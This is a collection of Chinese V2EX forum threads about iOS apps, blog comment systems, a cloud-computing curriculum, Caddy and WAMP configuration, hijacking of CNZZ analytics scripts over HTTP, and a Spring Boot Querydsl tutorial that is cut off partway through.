{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近刚转 iOS ，特有此问。。</p>\n</div></div>"], "reply": "22", "tittle": "iOS 有啥有趣好玩或者实用的 app 吗？", "comment": ["Pin", "Workflow", "Drafts", "workflow", " 看了一会才发现是 3 个软件", "之前看过一个 ios app 是在线看里番的，要用奇怪的操作打开隐藏模式， 233", "Blackbox", "Shadowrocket\r", "实用。。", "surge 。神器不解释。谁用谁知道。", " 神器不神器不知道，我就知道这东西神贵", "fyuse", "lifeline,推荐你玩一遍", "todoist 印象笔记和奇妙清单是我当时买了 iPhone 就立马安装的 APP", " 手抖了一下，没看清，花 12 购买了。。。。。。", "pendo  良心应用啊！", "omnifocus\r", "pin\r", "streaks\r", "focustime", "Pythonista", "reeder\r", "spark\r", "workflow", "Shadowrocket   youtube reddit spotify splashtop", " todoist and wunderlist ？黑人问好", " 太贵 现在还不送 mac 版", "我觉得 ‘即刻’ 挺不错", "The Room Three\r", "\r", "觉得挺不错的", "Excited Frog"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，虽然新闻已经过去几天了。<br>\n有没有稳定靠谱的评论系统用于静态博客啊……<br>\n之前这个多说的自定义 CSS 还是挺好看滴，虽然平时稳定性不那么优秀，怎么能说不玩就不玩了呢？</p>\n</div></div>"], "reply": "28", "tittle": "关于多说将要关闭了，大家的评论系统要用哪家？", "comment": ["Disqus", "wordpress 自带", "准备接入微博和 QQ 自建评论系统", "Disqus", " \r", "\r", "这个不是已经 404 了么", " \r", "\r", "hexo 静态博客，怎么整", " \r", "\r", "记得开源，谢谢！", " 我的文章是面向国外读者，国内的话貌似还有个搜狐的肠言", " \r", "\r", "格式比较丑。不过搜狐自家就是用的这个，会不会可靠点啊", " staticman", "网易云跟帖？", "自建 isso 评论： ", "Disqus ，但默认不开启评论，按需加载。\r", "\r", " ", "畅言吧 还可以", " \r", "\r", "这个比较好。\r", "前端弱鸡，有没有配置相关的教程。", "已经切换到 Disqus 了", "个人感觉畅言挺好用的，而且看起来比较小清新", "更重要的问题是：多说都关站了，你怎么保证你推荐的东西不关站？", "畅言还不错，推荐！", "Disqus", "打算同时提供 云跟帖 / Disqus 供用户选择", "github issue 能做静态博客评论系统不", "网易云跟帖", "评论这东西关闭也罢。", " 这博客用了 disqus api", "网易云跟帖后台管理一直跳转到首页，你们有没有遇到", "推荐肠炎的同学，请补充一句，搜狐肠炎是要备案的。不要浪费后来同学的时间去试。", "很奇怪很多人在找第三方的评论系统，就没想过搭建自己的评论系统？？？ \r", "\r", "      多说虽然倒下了，我失望了，毕竟天下没有免费的午餐，免费的东西并不靠谱的，然而我失望不是因为多说的倒下，而是那群在多说倒下后并没有学会教训，反而继续找第二个\"多说\"的站长们，我想对大多数站长们来说，一个博客网站除了内容可能评论就是最重要的东西。 \r", "\r", "      然而却又那么一群站长却看到多说无人维护的情况下，竟然不依不饶，毫不犹豫的继续选择了多说，不知其中是否有所谓的情怀在里头，我想说的是，现在的情怀值几个钱？？  \r", "\r", "      上面唠叨了一些，下面我要说的是我推荐博主们这个开源评论系统 Hashover ，采用 php 环境，评论数据采用 Sql,json,xml 三种方式存储，前段在跟作者积极沟通，作者也已经增加中文，数据在自己手上才能放心。\r", "\r", "下面说说优点: \r", "\r", "特点及优点 \r", "\r", "1.采用 php ，方便简单 \r", "2.数据在自己手上，备份迁移方便，定制性更强 \r", "3.支持垃圾评论过滤 \r", "4.支持五种智能排序方式 \r", "5.IP 地址阻止 \r", "6.电子邮件通知 \r", "7.采用线程回复，更高效更稳定 \r", "8.支持显示 gravar 图像 \r", "9.评论 Rss \r", "10.支持点赞功能 \r", "11.支持设置热评 \r", "12.支持定制 CSS \r", "13.支持定制 HTML \r", "14.支持固定链接 \r", "15.支持管理员账号 \r", "16.支持多语言(暂无中文，可手动翻译) \r", "17.支持显示外部图像 \r", "18.可限制 HTML 标记，保证评论安全 \r", "19.支持模板布局修改 \r", "20.支持网址补全 \r", "21.推荐人检查 \r", "22.支持 AJax 异步加载 \r", "\r", "\r", "特别强调：对于使用 disqus 评论的人可以使用这个[插件]( ", " \r", "\r", "当然有一部分人知道 lsso 这个评论系统，然而搭建这个需要 Python 环境，我想说的是不是每一个人都有服务器和 VPS 的，况且这个搭建困难，远不如 Hashover 来的简单， Hashover 只需要 php 环境最基本的要求，也就是意味着适合大部分站长的要求，适用性更强，我觉得更应该让大部分的站长用上这个评论系统。 \r", "\r", "\r", "也有一部分用动态博客的站长认为用自带评论就行了，当然这部分站长只要不更换博客程序当然高枕无忧。但也存在一下情况: \r", "\r", "1.经常切换博客的站长，那么只要保持 url 不变，那么评论就可以实现无缝切换，都不用转换，多好呀 \r", "\r", "2.动态博客切换静态博客的站长，保持 URL 不变，也能实现无缝切换 \r", "\r", "3.静态博客的站长们可以用这个评论系统，以后换静态博客毫无痛苦 \r", "\r", "想查看详细信息的朋友可以访问我的博文 \r", "\r", "\r", "…"]},
{"content": ["<div class=\"topic_content\">首先贴一下我们的课程安排:\r<br>计算机科学与技术，云计算方向\r<br>##大一上：计算机导论 C 语言程序设计 \r<br>##大一下：数字逻辑电路 JAVA\r<br>##大二上： java web 数据结构\r<br>##大二下：计算机网络 计算机组成与结构\r<br>##大三上：计算机网络与数据通信 云网络组件与管理 虚拟化技术应用 云存储技术应用 linux 系统应用 安卓系统应用\r<br>##大三下：晕网络与信息安全 云网络维与管理 云数据共享整合应用 大数据挖掘分析与应用\r<br>个人认为，云计算专业应该是比较偏向与运维部署的方向，搭建分布式系统。应该重系统部署与维护\r<br>而一直不懂为什么要学 java javaweb 安卓系统应用 大数据分析。这一类应该偏向与开发。\r<br>而且即便学语言可也应该学比如 python 或者 perl 等和自动化运维工具相关的语言。\r<br>不知各位 V 友怎么看？\r<br>##虽然在渣本，但从没有放弃学习技术。只是对学校的安排感到困惑。我们计算机组成教授就告诫我们，云计算本来应到研究生阶段开始学，本科学不到什么，也不好找工作。</div>"], "reply": "9", "tittle": "吐槽一下渣本的云计算专业。中兴卖给教育部 100 多台云计算实验服务器，我们学校也搞来一台和中兴合作开设云计算课程。", "comment": ["云计算专业。。厉害了", "学校多一个专业，向上好申请优势学科，增加经费，对外招生说起来也好听。\r", "\r", "但是，老师不懂 Python / Perl ，或者老师懂 Python / Perl ，周围实验环境跟不上，教材跟不上，导致只能继续教 Java 。自动化运维这种课，实验环境的搭建需要很复杂的设计，也没有特别好的教材可以拿来就用，自然也不会搞。\r", "\r", "（不过看你们的培养计划，云管理 XXX 里面怎么也得有一些自动化运维的内容在里面才是）。", "搞不太懂 CS 专业为啥要学数电模电", " 电子专业的路过。个人认为学习数电可以部分地搞清楚计算机到底是怎么运行的。而模电是电子学的基础，没有模电的理论框架，后面的东西很难解释。", "大学的话云计算就应该学如何实现啊……各种虚拟化是怎么做的架构是如何的，分布式有哪些算法思想是什么优缺点有什么，方向应当是启迪和培养出能设计出下一代云计算架构的思想。要是学如何应用的话，不就变专科了吗？", " \r", "没有电学的理论框架，模电的东西很难解释。\r", "没有粒子物理的理论框架，电学的东西很难解释。\r", "没有 xxx 的理论框架， yyy 的东西很难解释。\r", "\r", "其实人类知识体系不都是这样的结构吗。。。最基层的永远可以挖到数学、物理、哲学。但是有必要吗？\r", "\r", "私以为，针对某些方向，知其然就可以了，未必一定需要知其所以然。否则这事很容易失去可行性。\r", "具体来说，计算机专业，尤其偏软的“计算机科学与技术”，学到数电就可以了。\r", "甚至数电都可以选修，到计算机原理就可以了。", "比起以前的环境好多了，自学 GNU/Linux 吧", " 没有模电无所谓啊，从数电开始那是独立一套了", " 看学校要求吧。我校计算机专业的模电数电学的很水，基本就是建立个概念的事情。我们是电子专业，我们的数电其中一个实验就是用 74 系列的芯片做一个累加器出来，做完之后感觉学到了很多东西（比如说 CPU 的寄存器是怎么工作的，至少原理上想了很多）。多知道一点没坏处，至少能够增进对底层的了解；再说我觉得多数高校的 CS 专业都很水，完全谈不上课程压力大。我学的数电书上连 DRAM 的实现都有，可惜没看那一块。甚为惭愧。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题。。表示官方文档看的不是很明白~~ 添加起来好像很麻烦呀</p>\n<p>顺便问下 Caddy安装的git插件和yum install git安装的git是同一个东西吗？</p>\n</div></div>", "<div class=\"topic_content\">表示 Google 收录 V 站帖子好快。。找到答案了 <a target=\"_blank\" href=\"https://github.com/Unknwon/wuwen.org/issues/11\" rel=\"nofollow\">https://github.com/Unknwon/wuwen.org/issues/11</a></div>"], "reply": "目前尚无回", "tittle": "Caddy 安装之后如何添加新插件？", "comment": []},
{"content": "", "reply": "4", "tittle": "V2ex 用 google 登陆 500 了", "comment": ["我这页面回调卡住", "我在 PC 端也 500 了，但手机端还可以登录。楼主找到解决办法告诉我一声哈。谢了！", " 木有办法 我也是用的手机端", "之前有一次 好像被降权 Google 回调也是 500 找回密码 再清理下浏览器缓存… 登录"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>程序员快给你代码中的 cnzz 统计代码删了，有毒！</p>\n<p>最近几天打开网址动不动就是 chrome 的安全警告如下图：\n<img alt=\"\" src=\"http://ww4.sinaimg.cn/large/0060lm7Tgy1fe0khqfwofj30kh0d2jrq.jpg\">\n一开始没怎么注意，因为知道 chrome 升级快，可能是证书的问题，点了下面的《详细信息》《忽略》</p>\n<p>然后不停的是这个页面，我就开始怀疑是不是被 dns 劫持了，于是查看了 dns 发现没有毛病，各种换 DNS ，依旧有这个报警。</p>\n<p>然后我就开始对报警的页面查看源代码，根据 <a href=\"http://entry.ximeifang.com\" rel=\"nofollow\">entry.ximeifang.com</a> 线索，发现是 cnzz 的代码被感染了。如下图：\n<img alt=\"\" src=\"http://ww2.sinaimg.cn/large/0060lm7Tgy1fe0khqmsz4j31460o8mzp.jpg\">\n<img alt=\"\" src=\"http://ww2.sinaimg.cn/large/0060lm7Tgy1fe0khqtk8nj318i0iqmza.jpg\"></p>\n<p>然后我又对这个域名的所有者信息查询到如下图：\n<img alt=\"\" src=\"http://ww4.sinaimg.cn/large/0060lm7Tgy1fe0khqoc4aj30q10lomyj.jpg\">\n<img alt=\"\" src=\"http://ww4.sinaimg.cn/large/0060lm7Tgy1fe0khqox8cj30kj0fe3yw.jpg\"></p>\n<p>打开这些网址发现网站是这样的，基本确定是一个人！\n<img alt=\"\" src=\"http://ww4.sinaimg.cn/large/0060lm7Tgy1fe0khqfrmqj30hi06s3ys.jpg\"></p>\n<p>然后多次测试发现只要是带有 cnzz 统计代码的基本上都中招了，不知道是 cnzz 内部的问题还是第三人劫持，看来大家为了推广 https 也是够拼的！</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>基本确定是http劫持，但是因为很多网站都用的是cnzz的http代码，所以建议大家本地hosts上屏蔽cnzz.com下的域名。如果是站长程序员，请更新你的统计代码，走https</p>\n</div></div>"], "reply": "59", "tittle": "别用 CNZZ，有毒！ ", "comment": ["除了 DNS 污染还有 http 劫持。劫持统计网站的 js 是很常见的手段。", " \r", "DNS 劫持应该不是，因为我这边换了好几家 DNS （清了 DNS 缓存），依旧有，运营商劫持的话也应该不是，我在网上找这个问题，发现最近也有其他地区联通用户中招，我是电信，而且地区也不一样。\r", "不清楚是 cnzz 还是机房被入侵。", "楼主试试 ", " ，我这里不是最新版 chrome", " \r", "![]( ", " )", "mark ,看后续大家讨论情况", "你自己网站服务器问题，别怪 cnzz", " \r", " \r", " \r", " \r", "\r", "可以确定的是， keinx 和 qiayue 的站点在调用 js 文件的时候是 http 而不是 https ，所以基本考虑原因是 JS 被劫持了。\r", "\r", "可以试试我的站点 ", "\r", "\r", "我这里测试你们的都没问题", "和你们不同的是，我的统计代码都走 https 渠道", " \r", "和我的网站服务器有毛线关系\r", "我访问的网站好多都是，我自己的网站走的 https 没毛病\r", "明显是要么有人恶意给 cnzz http 里面劫持加了代码，要么就是 cnzz 自己加了代码", " \r", "谢谢，已经确定是 http 劫持，但是应该不是运营商，因为我找了好几个样本，来自不同地区的不同运营商\r", "所有的 https 都没有问题", "个人觉得是 hosts 的问题吧。。。\r", "以前用 chrome 很久都没遇到过安全警报\r", "换 hosts 后时不时就会有", " 我擦，才发现博客被 hacked 了，一直都没注意到 = =。难怪之前数据库空了好多……查查去……", "address=/bshare.cn/0.0.0.0\r", "address=/bashare.cn/0.0.0.0\r", "address=/3001.net/0.0.0.0\r", "address=/pic.x.soso.com/0.0.0.0\r", "address=/pingma.qq.com/0.0.0.0\r", "address=/51.la/0.0.0.0\r", "address=/umeng.com/0.0.0.0\r", "address=/cnzz.com/0.0.0.0\r", "address=/tajs.qq.com/0.0.0.0\r", "address=/nsclick.baidu.com/0.0.0.0\r", "address=/doubleclick.net/0.0.0.0\r", "address=/beacon.sina.com.cn/0.0.0.0\r", "address=/sax.sina.cn/0.0.0.0\r", "address=/sj.qq.com/0.0.0.0\r", "address=/s.pcapps.qq.com/0.0.0.0", "14 年我的 cnzz 也被劫持，问了客服没办法。最后弃用了", "百度统计也会被劫持为广告  （移动端）", "应该就是劫持的", " \r", "3ks\r", "有更新了一波。\r", "你怎么都是指向 0?我都是 127", "jb51 偶尔会出现，不是运营商劫持么，上海联通", "http 劫持了，我这里也复现了\r", "![]( ", ")", " 0.0.0.0 相当于直接返回空域名  127 在浏览器上可能还需要一点时间连接", " 回帖前看清楚帖子是好习惯", " 这波稳~", "联通，上上周就遇到过， *.ximeifang.com\r", "\r", "我写的是 address=/xyz.com/  dnsmasq 会返回不存在的域名", "上周刚升级到 https", " \r", "感谢普及知识", " 我这边正常访问", "感谢提醒", "CNZZ 是不是中国智障的意思蛤。。。。", "Adblock 好像默认已经屏蔽了各种统计", "wp 博客统计的话有何推荐啊", "表示我的统计代码没问题", "确定是劫持吗？我开 VPN 、换个网络都有问题，总不能是骨干网的 http 劫持吧", " \r", "难道是 cnzz 服务器被黑", "早就换百度了， cnzz 被收购了以后各种抽风", "cnzz 是个大坑", "哈哈哈，我也是被提示安全错误了。全局的 VPN 模式下诶。", " 你这么说的确是诶~ 我有时候刷博客就出来一个底部悬浮。 百度的 HTTPS 没用吗都= =", "好像没看到楼主说的， ", "\r", "\r", "![屏幕快照 2017-03-27 11.14.39.png]( ", ")", "运营商 HTTP 劫持只劫持 JS 文件这种是最恶心的..( https 大法好)", "应该是部分地区的劫持\r", "我把 ", " 放入 ", "\r", "部分地区返回的结果大小是 574B ，和楼主截图一样。\r", "大小为 763B 的地区未被劫持。", "我这里是用的 https 版的 cnzz ，没有发现被劫持", " dns 劫持并不是运营商劫持的唯一办法， HTTP 会话劫持也是常用手段", " 奇怪，我也用 cnzz 的，为啥我的统计代码就有 1k 多…… https 也是如此", " \r", "https 是安全的", " \r", "明白这个道理，但是这次 cnzz 这个是不是运营商所为不好说，因为据我统计有联通的有电信的，而且地区也不一样。", " \r", "你能确定这个是运营商所为还是 cnzz 那边的问题吗？", "https 正常， 23333", " \r", " 曾几何时 cdn 回源的时候被运营商劫持导致 cdn 上的文件就是被劫持的……不管你怎么挂代理都还是那样……", "回源也可以 https 啊", "cnzz 不就是因为被劫持的多了所以搞了 https?", " 没用，应该是统计 js 没有 hsts 的锅？最明显的例子是 it 之家，联通电信均有出现", "看了下没问题啊。。。应该不是 cnzz 的问题，老牌子统计了，比百度省心。", "全站 HTTPS 可避免…… CNZZ 用了很久了，貌似一直也没啥问题", " 但是回源也可以选择协议跟随啊……", " 我这里是随机劫持", "<script type=\"text/javascript\">var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \" https://\" : \" http://\");document.write(unescape(\"%3Cspan id='cnzz_stat_icon_4906525'%3E%3C/span%3E%3Cscript src='\" + cnzz_protocol + \"s96.cnzz.com/stat.php%3Fid%3D4906525%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E\"));</script>\r", "这行算 http 还是 https ？", " 收下了~谢", "换 HTTPS 吧。", "什么劫持不劫持，根本就是 cnzz 自己搞的木马，估计这家公司免费统计成本太高，老板最近穷疯了，卖这种流量。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>wamp 升级到 3.*后 v 又们有没有出现过在局域网内无法访问的问题啊,之前的版本貌似把 httpd.con 里面 Allow from 127.0.0.1 改成 Allow from all 就行了 但是最新版的并没有这个啊  我防火墙关了的!  求解....</p>\n</div></div>"], "reply": "3", "tittle": "深夜请教一个 wamp 的问题", "comment": ["<Directory >标签内\r", "    Allow from all\r", "    Require all granted\r", "\r", "新版本有一个 virtual host 目录，也需要更改。", "AllowOverride none\r", "Require all denied\r", "需要注释点吗  还是直接在后面加\r", "Allow from all \r", "Require all granted \r", "你说的 virtual hostvirtual hosts 是配置多站点的时候用的怎么改呢?", " AllowOverride none \r", "Require all denied \r", "需要注释点吗 还是直接在后面加 \r", "Allow from all \r", "Require all granted \r", "你说的 virtual hostvirtual hosts 是配置多站点的时候用的怎么改呢?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原文地址：<a href=\"https://lufficc.com/blog/spring-boot-jpa-querydsl\" rel=\"nofollow\">Spring Boot JPA - Querydsl</a></p>\n<p><a href=\"http://www.querydsl.com\" rel=\"nofollow\">Querydsl</a> 是一个类型安全的 Java 查询框架，支持 JPA, JDO, JDBC, Lucene, Hibernate Search 等标准。类型安全（ Type safety ）和一致性（ Consistency ）是它设计的两大准则。在 Spring Boot 中可以很好的弥补 JPA 的不灵活，实现更强大的逻辑。</p>\n<h2>依赖</h2>\n<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.querydsl&lt;/groupId&gt;\n    &lt;artifactId&gt;querydsl-apt&lt;/artifactId&gt;\n    &lt;scope&gt;provided&lt;/scope&gt;\n&lt;/dependency&gt;\n\n&lt;dependency&gt;\n    &lt;groupId&gt;com.querydsl&lt;/groupId&gt;\n    &lt;artifactId&gt;querydsl-jpa&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>因为是类型安全的，所以还需要加上 Maven APT plugin ，使用 APT 自动生成一些类:</p>\n<pre><code>&lt;project&gt;\n  &lt;build&gt;\n  &lt;plugins&gt;\n    ...\n    &lt;plugin&gt;\n    &lt;groupId&gt;com.mysema.maven&lt;/groupId&gt;\n    &lt;artifactId&gt;apt-maven-plugin&lt;/artifactId&gt;\n    &lt;version&gt;1.1.3&lt;/version&gt;\n    &lt;executions&gt;\n        &lt;execution&gt;\n            &lt;phase&gt;generate-sources&lt;/phase&gt;\n            &lt;goals&gt;\n                &lt;goal&gt;process&lt;/goal&gt;\n            &lt;/goals&gt;\n            &lt;configuration&gt;\n                &lt;outputDirectory&gt;target/generated-sources&lt;/outputDirectory&gt;\n                &lt;processor&gt;com.querydsl.apt.jpa.JPAAnnotationProcessor&lt;/processor&gt;\n            &lt;/configuration&gt;\n        &lt;/execution&gt;\n    &lt;/executions&gt;\n&lt;/plugin&gt;\n    ...\n  &lt;/plugins&gt;\n  &lt;/build&gt;\n&lt;/project&gt;\n</code></pre>\n<h2>基本概念</h2>\n<p>每一个 Model (使用 <code>@javax.persistence.Entity</code> 注解的)， Querydsl 都会在同一个包下生成一个以 <code>Q</code> 开头（默认，可配置）的类，来实现便利的查询操作。\n如：</p>\n<pre><code>JPAQueryFactory queryFactory = new JPAQueryFactory(entityManager);\n// 基本查询\nList&lt;Person&gt; persons = queryFactory.selectFrom(person)\n  .where(\n    person.firstName.eq(\"John\"),\n    person.lastName.eq(\"Doe\"))\n  .fetch();\n\n// 排序\nList&lt;Person&gt; persons = queryFactory.selectFrom(person)\n  .orderBy(person.lastName.asc(), \n           person.firstName.desc())\n  .fetch();\n\n// 子查询\nList&lt;Person&gt; persons = queryFactory.selectFrom(person)\n  .where(person.children.size().eq(\n    JPAExpressions.select(parent.children.size().max())\n                  .from(parent)))\n  .fetch();\n\n// 投影\nList&lt;Tuple&gt; tuples = queryFactory.select(\n    person.lastName, person.firstName, person.yearOfBirth)\n  .from(person)\n  .fetch();\n</code></pre>\n<p>有没有很强大？ 。。。。。 来看一个具体一点的例子吧：</p>\n<h2>实例</h2>\n<p>接着上一章的几个表，来一点高级的查询操作：</p>\n<p>Spring 提供了一个便捷的方式使用 Querydsl ，只需要在 <code>Repository</code> 中继承 <code>QueryDslPredicateExecutor</code> 即可：</p>\n<pre><code>@Repository\npublic interface UserRepository extends JpaRepository&lt;User, Long&gt;, QueryDslPredicateExecutor&lt;User&gt; {\n}\n</code></pre>\n<p>然后就可以使用 <code>UserRepository</code> 无缝和 Querydsl 连接：</p>\n<pre><code>userRepository.findAll(user.name.eq(\"lufifcc\")); // 所有用户名为 lufifcc 的用户\n\nuserRepository.findAll(\n        user.email.endsWith(\"@gmail.com\")\n                .and(user.name.startsWith(\"lu\"))\n                .and(user.id.in(Arrays.asList(520L, 1314L, 1L, 2L, 12L)))\n); // 所有 Gmail 用户，且名字以 lu 开始，并且 ID 在 520L, 1314L, 1L, 2L, 12L 中\n\nuserRepository.count(\n        user.email.endsWith(\"@outlook.com\")\n                .and(user.name.containsIgnoreCase(\"a\"))\n); // Outlook 用户，且名字以包含 a (不区分大小写)的用户数量\n\nuserRepository.findAll(\n        user.email.endsWith(\"@outlook.com\")\n                .and(user.posts.size().goe(5))\n); // Outlook 用户，且文章数大于等于 5\n\nuserRepository.findAll(\n        user.posts.size().eq(JPAExpressions.select(user.posts.size().max()).from(user))\n);// 文章数量最多的用户\n</code></pre>\n<p>另外， Querydsl 还可以采用 SQL 模式查询，加入依赖：</p>\n<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.querydsl&lt;/groupId&gt;\n    &lt;artifactId&gt;querydsl-sql&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre>\n<h4>1. 然后，获取所有用户邮箱：</h4>\n<pre><code>@GetMapping(\"users/emails\")\npublic Object userEmails() {\n    QUser user = QUser.user;\n    return queryFactory.selectFrom(user)\n            .select(user.email)\n            .fetch();\n}\n// 返回\n[\n  \"lufficc@qq.com\",\n  \"allen@qq.com\",\n  \"mike@qq.com\",\n  \"lucy@qq.com\"\n]\n</code></pre>\n<h4>2. 获取所有用户名和邮箱：</h4>\n<pre><code>@GetMapping(\"users/names-emails\")\npublic Object userNamesEmails() {\n    QUser user = QUser.user;\n    return queryFactory.selectFrom(user)\n            .select(user.email, user.name)\n            .fetch()\n            .stream()\n            .map(tuple -&gt; {\n                Map&lt;String, String&gt; map = new LinkedHashMap&lt;&gt;();\n                map.put(\"name\", tuple.get(user.name));\n                map.put(\"email\", tuple.get(user.email));\n                return map;\n            }).collect(Collectors.toList());\n}\n// 返回\n[\n  {\n    \"name\": \"Lufficc\",\n    \"email\": \"lufficc@qq.com\"\n  },\n  {\n    \"name\": \"Allen\",\n    \"email\": \"allen@qq.com\"\n  },\n  {\n    \"name\": \"Mike\",\n    \"email\": \"mike@qq.com\"\n  },\n  {\n    \"name\": \"Lucy\",\n    \"email\": \"lucy@qq.com\"\n  }\n]\n</code></pre>\n<p>注意到投影的时候，我们可以直接利用查询时用到的表达式来获取类型安全的值，如获取 <code>name</code> : <code>tuple.get(<a href=\"http://user.name\" rel=\"nofollow\">user.name</a>)</code>，返回值是 String 类型的。</p>\n<h4>3. 获取所有用户 ID ，名称，和他们的文章数量：</h4>\n<pre><code>@GetMapping(\"users/posts-count\")\npublic Object postCount() {\n    QUser user = QUser.user;\n    QPost post = QPost.post;\n    return queryFactory.selectFrom(user)\n            .leftJoin(user.posts, post)\n            .select(user.id, user.name, post.count())\n            .groupBy(user.id)\n            .fetch()\n            .stream()\n            .map(tuple -&gt; {\n                Map&lt;String, Object&gt; map = new LinkedHashMap&lt;&gt;();\n                map.put(\"id\", tuple.get(user.id));\n                map.put(\"name\", tuple.get(user.name));\n                map.put(\"posts_count\", tuple.get(post.count()));\n                return map;\n            }).collect(Collectors.toList());\n}\n// 返回\n[\n  {\n    \"id\": 1,\n    \"name\": \"Lufficc\",\n    \"posts_count\": 9\n  },\n  {\n    \"id\": 2,\n    \"name\": \"Allen\",\n    \"posts_count\": 6\n  },\n  {\n    \"id\": 3,\n    \"name\": \"Mike\",\n    \"posts_count\": 6\n  },\n  {\n    \"id\": 4,\n    \"name\": \"Lucy\",\n    \"posts_count\": 6\n  }\n]\n</code></pre>\n<h4>4. 获取所有用户名，以及对应用户的 <code>Java</code> 、<code>Python</code> 分类下的文章数量：</h4>\n<pre><code>@GetMapping(\"users/category-count\")\npublic Object postCategoryMax() {\n    QUser user = QUser.user;\n    QPost post = QPost.post;\n    NumberExpression&lt;Integer&gt; java = post.category\n            .name.lower().when(\"java\").then(1).otherwise(0);\n    NumberExpression&lt;Integer&gt; python = post.category\n            .name.lower().when(\"python\").then(1).otherwise(0);\n    return queryFactory.selectFrom(user)\n            .leftJoin(user.posts, post)\n            .select(user.name, user.id, java.sum(), python.sum(), post.count())\n            .groupBy(user.id)\n            .orderBy(user.name.desc())\n            .fetch()\n            .stream()\n            .map(tuple -&gt; {\n                Map&lt;String, Object&gt; map = new LinkedHashMap&lt;&gt;();\n                map.put(\"username\", tuple.get(user.name));\n                map.put(\"java_count\", tuple.get(java.sum()));\n                map.put(\"python_count\", tuple.get(python.sum()));\n                map.put(\"total_count\", tuple.get(post.count()));\n                return map;\n            }).collect(Collectors.toList());\n}\n\n// 返回\n[\n  {\n    \"username\": \"Mike\",\n    \"java_count\": 3,\n    \"python_count\": 1,\n    \"total_count\": 5\n  },\n  {\n    \"username\": \"Lufficc\",\n    \"java_count\": 2,\n    \"python_count\": 4,\n    \"total_count\": 9\n  },\n  {\n    \"username\": \"Lucy\",\n    \"java_count\": 1,\n    \"python_count\": 1,\n    \"total_count\": 5\n  },\n  {\n    \"username\": \"Allen\",\n    \"java_count\": 2,\n    \"python_count\": 1,\n    \"total_count\": 5\n  }\n]\n</code></pre>\n<p>注意这里用到了强大的 <a href=\"http://www.querydsl.com/static/querydsl/4.1.3/reference/html_single/#d0e2105\" rel=\"nofollow\">Case 表达式（ Case expressions ）</a> 。</p>\n<h4>5. 统计每一年发文章数量，包括 <code>Java</code> 、<code>Python</code> 分类下的文章数量：</h4>\n<pre><code>@GetMapping(\"posts-summary\")\npublic Object postsSummary() {\n    QPost post = QPost.post;\n    ComparableExpressionBase&lt;?&gt; postTimePeriodsExp = post.createdAt.year();\n    NumberExpression&lt;Integer&gt; java = post.category\n            .name.lower().when(\"java\").then(1).otherwise(0);\n    NumberExpression&lt;Integer&gt; python = post.category\n            .name.lower().when(\"python\").then(1).otherwise(0);\n    return queryFactory.selectFrom(post)\n            .groupBy(postTimePeriodsExp)\n            .select(postTimePeriodsExp, java.sum(), python.sum(), post.count())\n            .orderBy(postTimePeriodsExp.asc())\n            .fetch()\n            .stream()\n            .map(tuple -&gt; {\n                Map&lt;String, Object&gt; map = new LinkedHashMap&lt;&gt;();\n                map.put(\"time_period\", tuple.get(postTimePeriodsExp));\n                map.put(\"java_count\", tuple.get(java.sum()));\n                map.put(\"python_count\", tuple.get(python.sum()));\n                map.put(\"total_count\", tuple.get(post.count()));\n                return map;\n            }).collect(Collectors.toList());\n}\n\n// 返回\n[\n  {\n    \"time_period\": 2015,\n    \"java_count\": 1,\n    \"python_count\": 3,\n    \"total_count\": 6\n  },\n  {\n    \"time_period\": 2016,\n    \"java_count\": 4,\n    \"python_count\": 2,\n    \"total_count\": 14\n  },\n  {\n    \"time_period\": 2017,\n    \"java_count\": 3,\n    \"python_count\": 2,\n    \"total_count\": 7\n  }\n]\n</code></pre>\n<h2>补充一点</h2>\n<p>Spring 参数支持解析 <code>com.querydsl.core.types.Predicate</code>，根据用户请求的参数自动生成 <code>Predicate</code>，这样搜索方法不用自己写啦，比如：</p>\n<pre><code>@GetMapping(\"posts\")\npublic Object posts(@QuerydslPredicate(root = Post.class) Predicate predicate) {\n    return postRepository.findAll(predicate);\n}\n// 或者顺便加上分页\n@GetMapping(\"posts\")\npublic Object posts(@QuerydslPredicate(root = Post.class) Predicate predicate, Pageable pageable) {\n    return postRepository.findAll(predicate, pageable);\n}\n</code></pre>\n<p>然后请求：</p>\n<pre><code>/posts?title=title01 // 返回文章 title 为 title01 的文章\n\n/posts?id=2 // 返回文章 id 为 2 的文章\n\n/posts?category.name=Python // 返回分类为 Python 的文章（你没看错，可以嵌套，访问关系表中父类属性）\n\n/posts?user.id=2&amp;category.name=Java // 返回用户 ID 为 2 且分类为 Java 的文章\n</code></pre>\n<p>注意，这样不会产生 <code>SQL</code> 注入问题的，因为不存在的属性写了是不起效果的， Spring 已经进行了判断。\n再补充一点，你还可以修改默认行为，继承 <code>QueryDslPredicateExecutor</code> 接口：</p>\n<pre><code>@Repository\npublic interface PostRepository extends JpaRepository&lt;Post, Long&gt;, QueryDslPredicateExecutor&lt;Post&gt;, QuerydslBinderCustomizer&lt;QPost&gt; {\n    default void customize(QuerydslBindings bindings, QPost post) {\n        bindings.bind(post.title).first(StringExpression::containsIgnoreCase);\n    }\n}\n</code></pre>\n<p>这样你再访问 <code>/posts?title=title01</code> 时，返回的是文章标题包含 title01 ，而不是仅仅等于的所有文章啦!</p>\n<h2>总结</h2>\n<p>本文知识抛砖引玉， Querydsl 的强大之处并没有完全体现出来，而且 Spring Boot 官方也提供了良好的支持，所以，掌握了 Querydsl ，真的不愁 Java 写不出来的 <code>Sql</code>，重要的是类型安全（没有强制转换），跨数据库（ Querydsl 底层还是 JPA 这样的技术，所有只要不写原生 Sql ，基本关系型数据库通用）。对了，源代码在这里 <a href=\"https://github.com/lufficc/example-jpa\" rel=\"nofollow\">example-jpa</a>，可以直接运行的~~\n大家有什么好的经验也可以在评论里提出来啊。</p>\n</div></div>"], "reply": "7", "tittle": "Spring Boot JPA - 使用 Querydsl 处理复杂的操作", "comment": ["JPA 算得上是 ORM 